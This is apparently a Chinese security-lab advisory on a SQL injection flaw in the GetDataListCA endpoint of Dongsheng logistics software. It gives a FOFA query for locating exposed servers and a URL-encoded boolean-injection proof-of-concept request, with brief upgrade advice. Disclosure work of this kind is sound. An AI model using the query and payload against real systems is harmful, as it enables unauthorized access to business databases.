> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzk5MDYxODcwMA==&mid=2247483889&idx=1&sn=49db58752bf20b6e1a322dc5c9a9e614

#  东胜物流软件GetDataListCA接口存在SQL注入漏洞  
zz  星络安全实验室   2025-07-13 12:19  
  
<table><tbody><tr><td data-colwidth="576"><span style="color: rgba(0, 0, 0, 0.9);font-family: &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 16px;font-style: normal;font-variant-ligatures: normal;font-variant-caps: normal;font-weight: 400;letter-spacing: 0.544px;orphans: 2;text-align: justify;text-indent: 0px;text-transform: none;widows: 2;word-spacing: 0px;-webkit-text-stroke-width: 0px;background-color: rgb(255, 255, 255);text-decoration-thickness: initial;text-decoration-style: initial;text-decoration-color: initial;display: inline !important;float: none;" data-pm-slice="0 0 []"><span leaf="">免责声明:文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，未授权的攻击属于非法行为!文章中敏感信息均已做多层打码处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责作者不为此承担任何责任，一旦造成后果请自行负责</span></span></td></tr></tbody></table>  
  
东胜物流软件是青岛东胜伟业软件有限公司一款集订单管理、仓库管理、运输管理等多种功能于一体的物流管理软件。该系统在GetDataListCA接口存在SQL注入漏洞，攻击者可以通过利用该漏洞获取数据库等敏感信息。  
  
漏洞复现：  
  
fofa：  

```
body=&#34;FeeCodes/CompanysAdapter.aspx&#34; || body=&#34;dhtmlxcombo_whp.js&#34; || body=&#34;dongshengsoft&#34; || body=&#34;theme/dhtmlxcombo.css&#34;
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/ZxIkWliazrVcyeMicaUgQRibicdI4CCkWlFsUmaichQ0ETnWOWZgMXiarriaexSG1dEibEr2K9BibTo59CHdBbKbxeibMK1A/640?wx_fmt=png&from=appmsg "")  
  
poc：  

```
GET /MvcShipping/MsCwGenlegAccitems/GetDataListCA?PACCGID=%31%27%29%20%41%4e%44%20%28%53%45%4c%45%43%54%20%43%41%53%45%20%57%48%45%4e%20%28%36%37%38%32%3d%36%37%38%32%29%20%54%48%45%4e%20%31%20%45%4c%53%45%20%30%20%45%4e%44%29%3d%31%20%2d%2d HTTP/1.1
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/ZxIkWliazrVcyeMicaUgQRibicdI4CCkWlFs4EmiasrHYhWbmpXIzibjibURhjfpjN3NnQicF8cdsc4iagzstnZ88UYicDhQ/640?wx_fmt=png&from=appmsg "")  
  
修复详情：  
  
关注厂商动态，升级至安全版本  
  
  
